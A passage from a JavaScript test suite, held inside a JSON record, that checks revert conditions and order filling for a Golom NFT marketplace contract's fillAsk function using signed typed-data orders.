'0x0000000000000000000000000000000000000000',\n                    {\n                        paymentAmt: prePaymentAmt,\n                        paymentAddress: await governance.getAddress(),\n                    },\n                    receiver,\n                    {\n                        value: utils.parseEther('10.25'),\n                    }\n                )\n            ).to.be.revertedWith('invalid orderType');\n        });\n\n        it('should revert if order status is not equal to 3', async () => {\n            let exchangeAmount = ethers.utils.parseEther('1'); // cut for the exchanges\n            let prePaymentAmt = ethers.utils.parseEther('0.25'); // royalty cut\n            let totalAmt = ethers.utils.parseEther('10');\n            let tokenId = await testErc721.current();\n\n            const order = {\n                collection: testErc721.address,\n                tokenId: tokenId,\n                signer: await maker.getAddress(),\n                orderType: 0,\n                totalAmt: totalAmt,\n                exchange: { paymentAmt: exchangeAmount, paymentAddress: await exchange.getAddress() },\n                prePayment: { paymentAmt: prePaymentAmt, paymentAddress: await prepay.getAddress() },\n                isERC721: true,\n                tokenAmt: 1,\n                refererrAmt: 0,\n                root: '0x0000000000000000000000000000000000000000000000000000000000000000',\n                reservedAddress: constants.AddressZero,\n                nonce: 0,\n                deadline: Date.now() - 10000000,\n                r: '',\n                s: '',\n                v: 0,\n            };\n\n            let signature = (await maker._signTypedData(domain, types, order)).substring(2);\n\n            order.r = '0x' + signature.substring(0, 64);\n            order.s = '0x' + signature.substring(64, 128);\n            order.v = parseInt(signature.substring(128, 130), 16);\n            golomTrader.connect(taker).fillAsk(\n                order,\n                1,\n                '0x0000000000000000000000000000000000000000',\n                {\n                    paymentAmt: prePaymentAmt,\n                    paymentAddress: await governance.getAddress(),\n                },\n                receiver,\n                {\n                    value: utils.parseEther('10.25'),\n                }\n            )\n            await expect(\n                golomTrader.connect(taker).fillAsk(\n                    order,\n                    1,\n                    '0x0000000000000000000000000000000000000000',\n                    {\n                        paymentAmt: prePaymentAmt,\n                        paymentAddress: await governance.getAddress(),\n                    },\n                    receiver,\n                    {\n                        value: utils.parseEther('10.25'),\n                    }\n                )\n            ).to.be.revertedWith('order not valid');\n        });\n\n        it('should update the filled mapping', async () => {\n            let exchangeAmount = ethers.utils.parseEther('1'); // cut for the exchanges\n            let prePaymentAmt = ethers.utils.parseEther('0.25'); // royalty cut\n            let totalAmt = ethers.ut"
    }
  ]
}